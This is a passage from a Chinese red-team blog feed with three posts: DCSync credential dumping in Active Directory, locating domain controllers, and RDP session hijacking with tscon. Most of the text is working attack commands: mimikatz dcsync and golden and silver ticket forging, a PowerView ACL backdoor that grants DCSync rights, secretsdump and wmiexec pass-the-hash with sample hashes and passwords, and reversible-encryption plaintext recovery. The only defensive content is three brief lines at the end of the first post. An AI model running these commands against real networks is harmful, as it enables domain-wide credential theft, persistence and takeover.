<p>拥有上述条件的任意用户权限，即可导出域内任意用户的hash</p>
<h3 id="mimikatz">mimikatz</h3>
<p>导出administrator用户的Hash</p>
<p>域内</p>
<p><code>lsadump::dcsync /domain:hiro.com /user:administrator </code></p>
<p>域外</p>
<p><code>lsadump::dcsync /domain:xx /dc:xx /user:krbtgt /authuser:dc02$ /authdomain:xx /authpassword:&quot;&quot; /authntlm</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/3.jpg" alt=""></p>
<p>域控导出所有域用户的哈希</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:hiro.com /all /csv
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/4.jpg" alt=""></p>
<p>其他机器读取域内密码hash</p>
<p><code>lsadump::dcsync /domain:redteam.lab /dc:dc1.redteam.lab /user:administrator /authuser:dc1$ /authdomain:redteam.lab /authpassword:&quot;&quot; /authntlm</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/5.png" alt=""></p>
<h3 id="后门利用">后门利用</h3>
<p>DCsync是几个权限的集合体，如果使其具有DCSync权限的话，可以向域内普通用户添加如下三条ACE(Access Control Entries)：</p>
<p>使用Empire下的powerview.ps1脚本执行以上三条ACE</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">DS-Replication-Get-Changes—&gt;(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
</span></span><span class="line"><span class="cl">DS-Replication-Get-Changes-All—&gt;(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
</span></span><span class="line"><span class="cl">DS-Replication-Get-Changes—&gt;(GUID:89e95b76-444d-4c62-991a-0facbeda640c)
</span></span></code></pre></div><p>在域管用户上给域用户win7添加以上两条ACE</p>
<p><code>Add-DomainObjectAcl -TargetIdentity “DC=hiro,DC=com” -PrincipalIdentity win7 -Rights DCSync -Verbose</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/6.jpg" alt=""></p>
<p>当用户win7具有DCSync权限后，可以导出域内哈希：</p>
<p><code>python3 secretsdump.py hiro.com/win7:123456QWE.@192.168.228.10 -dc-ip 192.168.228.10</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/7.jpg" alt=""></p>
<p>给域用户win7删除以上三条ACE</p>
<p><code>Remove-DomainObjectAcl -TargetIdentity “DC=hiro,DC=com” -PrincipalIdentity win7 -Rights DCSync -Verbose</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/8.jpg" alt=""></p>
<p>域用户win7失去了DCSync，同样也无法导出域内hash了</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/9.jpg" alt=""></p>
<h2 id="使用黄金票据dcsync导出域内所有用户的hash">使用黄金票据+DCSync导出域内所有用户的Hash</h2>
<h3 id="生成黄金票据">生成黄金票据：</h3>
<p>得到krbtgt用户hash</p>
<p><code>lsadump::dcsync /domain:hiro.com /user:krbtgt</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/10.jpg" alt=""></p>
<p>导入黄金票据</p>
<p><code>kerberos::golden /user:administrator /domain:hiro.com /sid:S-1-5-21-1909134247-741334235-3019370817 /krbtgt:5f468f6d7ac43c327396d832a0241d81 /ptt </code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/11.jpg" alt=""></p>
<h3 id="导出域hash">导出域hash</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">kerberos::list 
</span></span></code></pre></div><p>导出所有用户的哈希</p>
<p><code>lsadump::dcsync /domain:hiro.com /all /csv</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/12.jpg" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/13.jpg" alt=""></p>
<h3 id="哈希传递">哈希传递</h3>
<p><code>python3 .\wmiexec.py hiro/administrator@192.168.228.10 -hashes aad3b435b51404eeaad3b435b51404ee:e9bf196dc93a1219e3b2e79b1b7aa36e</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/14.jpg" alt=""></p>
<h2 id="dcsync可逆加密存储密码">Dcsync+可逆加密存储密码</h2>
<p>Active Directory 帐户有一项遗留功能，称为“可逆加密”。通常，使用 NT单向函数对用户密码进行散列以创建 NTLM hash。NTLM hash无法逆转，必须破解。</p>
<p>如果启用了可逆加密，则用户的密码将使用加密存储，这意味着可以将加密的数据还原回用户的密码。使用可逆加密存储的密码不是散列，因为可以调用函数来恢复原始明文密码。</p>
<hr>
<p>帐户启用可逆加密，帐户的明文密码不会立即可用；如果对帐户启用了可逆加密并且用户在设置此配置后更改了密码，则明文密码将保存在 Active Directory 数据库中。当用户再次调用Dcsync后会显示其明文。</p>
<hr>
<p>勾选“可逆加密存储密码”这个属性后，用户再次更改密码会显示其明文密码；将administrator设置为可逆加密存储密码</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/15.jpg" alt=""></p>
<p>使用ldap条件勾选其使用可逆加密存储属性的帐户</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">get-adobject -ldapfilter “(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=128))”
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">Set-ADUser marry -AllowReversiblePasswordEncryption $true
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/16.jpg" alt=""></p>
<p>更改administrator密码，dcsync就能显示其明文密码</p>
<p><code>python3 secretsdump.py redteam.lab/administrator:Qq123456..@192.168.129.130 -dc-ip 192.168.129.130 -just-dc-user administrator</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/17.jpg" alt=""></p>
<h2 id="使用machineaccount实现dcsync">使用MachineAccount实现DCSync</h2>
<p>MachineAccount是每台计算机在安装系统后默认生成的计算机帐户</p>
<p>如果计算机加入域中，会将计算机帐户的密码同步到域控制器并保存在域控制器的NTDS.dit文件中</p>
<p>计算机帐户的密码默认每30天自动更新，密码长度为120个字符，所以说，即使获得了计算机帐户密码的hash，也很难还原出计算机帐户的明文口令</p>
<h3 id="关闭域内计算机帐户密码自动更新的两种方法适用于域内主机">关闭域内计算机帐户密码自动更新的两种方法（适用于域内主机）</h3>
<ol>
<li>修改组策略</li>
</ol>
<p>选择Default Domain Policy</p>
<p><code>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/18.png" alt=""></p>
<ol>
<li>修改组策略的配置文件</li>
</ol>
<p>Default Domain Policy对应的guid为31B2F340-016D-11D2-945F-00C04FB984F9</p>
<p>配置文件路径为：</p>
<p><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit</code></p>
<p>修改文件GptTmpl.inf，在[Registry Values]下添加新的内容：</p>
<p><code>MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange=4,1</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/19.png" alt=""></p>
<p>配置完成，将系统时间调快30天，hash保持不变</p>
<h2 id="获得machineaccount-hash的方法">获得MachineAccount hash的方法</h2>
<h3 id="1通过本地sam文件中读取密码哈希">1.通过本地SAM文件中读取密码哈希</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mimikatz命令示例：
</span></span><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">token::elevate
</span></span><span class="line"><span class="cl">lsadump::secrets
</span></span></code></pre></div><p>返回的结果中，$machine.ACC项对应计算机帐户，如下图</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/20.png" alt=""></p>
<h3 id="2使用dcsync导出所有帐户的hash">2.使用DCSync导出所有帐户的hash</h3>
<p>(1)使用mimikatz</p>
<p>在域控制器上使用mimikatz导出域内所有用户的hash</p>
<p><code>mimikatz.exe “lsadump::dcsync /domain:test.com /all /csv” exit</code></p>
<p>(2)使用 secretsdump.py</p>
<p><code>python3 secretsdump.py test/Administrator:DomainAdmin123!@192.168.1.1</code></p>
<p>secretsdump.py的实现原理：</p>
<p>使用计算机帐户hash通过smbexec或者wmiexec远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的hash，同时通过Dcsync或从NTDS.dit文件中导出所有域用户的hash。</p>
<h3 id="3通过cve-2020-1472">3.通过CVE-2020-1472</h3>
<p>CVE-2020-1472能够在未授权的状态下远程修改DC计算机帐户的口令hash</p>
<p>像服务器一样，DC拥有一个带有密码的机器帐户，该帐户以加密方式存储在注册表中。引导时将其加载到lsass中。如果使用Zerologon更改密码，则仅AD中NTDS密码会更改，而不是注册表或lsass中的密码。利用后每当发出新的Kerberos票证时，DC无法使用lsass中的机器帐户密码来解密服务票证，并且无法使用Kerberos中断身份验证。</p>
<h2 id="使用machineaccount实现dcsync-1">使用MachineAccount实现DCSync</h2>
<p>例如，获得了域控制器DC1的计算机帐户hash为7da530fba3b15a2ea21ce7db8110d57b</p>
<h3 id="1使用mimikatz">1.使用mimikatz</h3>
<p>这里需要制作白银票据(Silver Ticket)，接着获得LDAP服务的访问权限</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mimikatz “kerberos::golden /domain:test.com /sid:S-1-5-21-254706111-4049838133-2416586677 /target:DC1.test.com /service:LDAP /rc4:7da530fba3b15a2ea21ce7db8110d57b /user:krbtgt /ptt” “lsadump::dcsync /domain:test.com /all /csv” exit
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/sid表示域的sid，
</span></span><span class="line"><span class="cl">/rc4表示计算机帐户的NTLM hash
</span></span><span class="line"><span class="cl">/user:krbtgt表示伪造成用户krbtgt，生成票据
</span></span></code></pre></div><h3 id="2使用secretsdump">2.使用secretsdump</h3>
<p><code>python2 secretsdump.py -hashes :e411580b657837aee7aaadb6e2a4449b redteam/DC1$@192.168.129.130 -just-dc-user krbtgt</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/21.png" alt=""></p>
<p>注意：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.secretsdump支持从域外的计算机连接到域控
</span></span><span class="line"><span class="cl">2.如果使用域内普通计算机帐户的hash连接对应的计算机，会提示rpc_s_access_denied
</span></span></code></pre></div><p>也可以通过 wmiexec.py 或smbexec.py远程执行cmd命令 （<code>server2016已经不能用机器账户进行认证登陆</code>）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">python smbexec.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1 whoami /priv
</span></span><span class="line"><span class="cl">python wmiexec.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1 whoami /priv
</span></span></code></pre></div><h3 id="防御">防御</h3>
<p>1.通过网络监控检测来自白名单以外的域控制器数据同步复制。</p>
<p>2.给域控设置白名单，只允许白名单内的域控IP发起数据同步请求。</p>
<p>3.利用AD自检工具查看哪些域用户有Dcsync的权限。</p>
]]></content>
        </item>
        
        <item>
            <title>定位域控</title>
            <link>https://lzzbb.github.io/posts/2020/09/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7/</link>
            <pubDate>Tue, 22 Sep 2020 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2020/09/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7/</guid>
            <description>DC通常开了88和389，但ldap不只是域才用，464端口用于复制、用户和计算机身份验证、信任，所以也可以探测464端口来判断是否是DC。
net group “domain controllers” /do nslookup -type=all _ldap._tcp.dc._msdcs.redteam.lab （`会返回所有dcip`） net time /do systeminfo net config workstation ipconfig /all nltest /domain_trusts /all_trusts #返回受信任域列表 nltest /dclist:redteam.lab nltest /dsgetdc:redteam.lab 通过DNS指向 （需要绑定DNS） Windows nslookup –qt=ns redteam.lab Nslookup -type=SRV _ldap._tcp.redteam.lab linux dig redteam.lab @192.168.129.130 dig _ldap._tcp.redteam.lab srv @192.168.129.130 域外定位域机器 (无需绑定DNS) nslookup redteam.lab 192.168.129.130 nslookup dmwin10.redteam.lab 192.168.129.130 </description>
            <content type="html"><![CDATA[<p>DC通常开了88和389，但ldap不只是域才用，464端口用于复制、用户和计算机身份验证、信任，所以也可以探测<code>464端口</code>来判断是否是DC。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    net group “domain controllers” /do 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    nslookup -type=all _ldap._tcp.dc._msdcs.redteam.lab （`会返回所有dcip`）
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    net time /do 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    systeminfo 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    net config workstation 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    ipconfig /all 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    nltest /domain_trusts /all_trusts #返回受信任域列表 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    nltest /dclist:redteam.lab 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    nltest /dsgetdc:redteam.lab 
</span></span></code></pre></div><h2 id="通过dns指向-需要绑定dns">通过DNS指向 （需要绑定DNS）</h2>
<h3 id="windows">Windows</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">nslookup –qt=ns redteam.lab
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nslookup -type=SRV _ldap._tcp.redteam.lab
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/getdc/1.png" alt=""></p>
<h3 id="linux">linux</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">dig redteam.lab @192.168.129.130
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dig _ldap._tcp.redteam.lab srv @192.168.129.130
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/getdc/2.png" alt=""></p>
<h2 id="域外定位域机器-无需绑定dns">域外定位域机器 (无需绑定DNS)</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">nslookup redteam.lab 192.168.129.130
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nslookup dmwin10.redteam.lab 192.168.129.130
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/getdc/3.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>rdp会话劫持</title>
            <link>https://lzzbb.github.io/posts/2020/09/rdp%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/</link>
            <pubDate>Sun, 20 Sep 2020 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2020/09/rdp%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/</guid>
            <description>执行quser 或者 qwinsta 查看会话id 尽管目前是离线状态，如果机器是在三天内注销的，也可以进行登陆劫持
ps：需要system权限（psexec或者凭证窃取，shift后门都可）
Tscon + 要劫持的会话ID + /DEST:你的会话名 #执行完就会切到你劫持会话的桌面。
tscon 3 /DEST:console
ID为2目前的状态已经断开了，但是如果是在三天之内注销的，还是可以登陆劫持。
tscon 2 /DEST:console</description>
            <content type="html"><![CDATA[<h2 id="执行quser-或者-qwinsta-查看会话id">执行quser 或者 qwinsta 查看会话id</h2>
<p>尽管目前是离线状态，如果机器是在三天内注销的，也可以进行登陆劫持</p>
<p>ps：需要system权限（psexec或者凭证窃取，shift后门都可）</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/rdp%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/1.png" alt=""></p>
<p><code>Tscon + 要劫持的会话ID + /DEST:你的会话名    #执行完就会切到你劫持会话的桌面。</code></p>
<p><code>tscon 3 /DEST:console</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/rdp%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/2.png" alt=""></p>
<p>ID为2目前的状态已经断开了，但是如果是在三天之内注销的，还是可以登陆劫持。</p>
<p><code>tscon 2 /DEST:console</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/rdp%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/3.png" alt=""></p>
]]></content>
        </item>
        
    </channel>
</rss>
